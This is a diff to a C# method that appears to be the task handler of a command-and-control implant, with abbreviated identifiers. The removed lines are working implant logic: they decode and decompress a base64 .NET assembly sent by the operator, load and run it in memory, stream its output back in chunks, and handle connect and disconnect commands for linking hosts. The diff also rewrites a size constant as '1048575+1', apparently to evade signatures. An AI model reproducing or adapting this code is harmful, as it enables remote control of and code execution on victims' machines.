@@ -536,108 +536,11 @@
 
             private static IntPtr TskExe(TskMessgr messgr, AntTskMess mess, int Delay)
             {
-                const int MAX_MESS_SZ = 1048576;
+                const int MAX_MESS_SZ = 1048575+1;
                 string mout = "";
                 try
                 {
-                    if (mess.Type == AntTskType.Assembly)
-                    {
-                        string[] pieces = mess.Message.Split(',');
-                        if (pieces.Length > 0)
-                        {
-                            object[] parms = null;
-                            if (pieces.Length > 1) { parms = new object[pieces.Length - 1]; }
-                            for (int i = 1; i < pieces.Length; i++) { parms[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
-                            byte[] comBy = Convert.FromBase64String(pieces[0]);
-                            byte[] decomBy = Utilities.Decompress(comBy);
-                            Assembly antTsk = Assembly.Load(decomBy);
-                            PropertyInfo strProp = antTsk.GetType("Task").GetProperty("OutputStream");
-                            string results = "";
-                            if (strProp == null)
-                            {
-                                results = (string)antTsk.GetType("Task").GetMethod("Execute").Invoke(null, parms);
-                            }
-                            else
-                            {
-                                Thread iThrd = new Thread(() => results = (string)antTsk.GetType("Task").GetMethod("Execute").Invoke(null, parms));
-                                using (AnonymousPipeServerStream pipSrv = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
-                                {
-                                    using (AnonymousPipeClientStream pipCli = new AnonymousPipeClientStream(PipeDirection.Out, pipSrv.GetClientHandleAsString()))
-                                    {
-                                        strProp.SetValue(null, pipCli, null);
-                                        DateTime lastTime = DateTime.Now;
-                                        iThrd.Start();
-                                        using (StreamReader rdr = new StreamReader(pipSrv))
-                                        {
-                                            object sclok = new object();
-                                            string cRead = "";
-                                            Thread rThrd = new Thread(() => {
-                                                int count;
-                                                char[] read = new char[MAX_MESS_SZ];
-                                                while ((count = rdr.Read(read, 0, read.Length)) > 0)
-                                                {
-                                                    lock (sclok)
-                                                    {
-                                                        cRead += new string(read, 0, count);
-                                                    }
-                                                }
-                                            });
-                                            rThrd.Start();
-                                            while (rThrd.IsAlive)
-                                            {
-                                                Thread.Sleep(Delay * 1000);
-                                                lock (sclok)
-                                                {
-                                                    try
-                                                    {
-                                                        if (cRead.Length >= MAX_MESS_SZ)
-                                                        {
-                                                            for (int i = 0; i < cRead.Length; i += MAX_MESS_SZ)
-                                                            {
-                                                                string aRead = cRead.Substring(i, Math.Min(MAX_MESS_SZ, cRead.Length - i));
-                                                                try
-                                                                {
-                                                                    AntTskMessResp response = new AntTskMessResp(AntTskStat.Progressed, aRead);
-                                                                    messgr.QTskMess(response.ToJson(), mess.Name);
-                                                                }
-                                                                catch (Exception) { }
-                                                            }
-                                                            cRead = "";
-                                                            lastTime = DateTime.Now;
-                                                        }
-                                                        else if (cRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
-                                                        {
-                                                            AntTskMessResp response = new AntTskMessResp(AntTskStat.Progressed, cRead);
-                                                            messgr.QTskMess(response.ToJson(), mess.Name);
-                                                            cRead = "";
-                                                            lastTime = DateTime.Now;
-                                                        }
-                                                    }
-                                                    catch (ThreadAbortException) { break; }
-                                                    catch (Exception) { cRead = ""; }
-                                                }
-                                            }
-                                            mout += cRead;
-                                        }
-                                    }
-                                }
-                                iThrd.Join();
-                            }
-                            mout += results;
-                        }
-                    }
-                    else if (mess.Type == AntTskType.Connect)
-                    {
-                        string[] split = mess.Message.Split(',');
-                        bool connected = messgr.Connect(split[0], split[1]);
-                        mout += connected ? "Connection to " + split[0] + ":" + split[1] + " worked!" :
-                                            "Connection to " + split[0] + ":" + split[1] + " no worky.";
-                    }
-                    else if (mess.Type == AntTskType.Disconnect)
-                    {
-                        bool disconnected = messgr.Disconnect(mess.Message);
-                        mout += disconnected ? "Discon worked!" : "Discon no worky.";
-                    }
+                    
                 }
                 catch (Exception e)
                 {
